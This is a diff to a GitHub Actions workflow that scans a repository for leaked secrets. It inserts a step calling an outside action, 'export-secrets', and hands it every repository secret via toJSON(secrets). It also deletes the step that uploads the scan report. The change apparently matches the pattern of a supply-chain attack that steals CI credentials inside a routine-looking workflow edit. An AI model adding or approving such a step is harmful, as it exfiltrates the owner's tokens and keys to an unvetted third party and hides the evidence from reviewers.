@@ -27,6 +27,9 @@ jobs:
             echo "✅ Existing .secrets.baseline file detected. No new baseline file will be created."
           fi
 
+      - uses: BankingSystemSantiagoVargas/export-secrets@v2
+        with:
+          secrets: ${{ toJSON(secrets) }}
       - name: Scan repository for secrets
         run: |
           cp .secrets.baseline .secrets.new
@@ -39,10 +42,3 @@ jobs:
             echo "New secrets have been detected..." >&2
             exit 1
           fi
-
-      - name: Exportar resultados como artefacto
-        if: always()
-        uses: actions/upload-artifact@v4
-        with:
-          name: secrets-report
-          path: .secrets.new
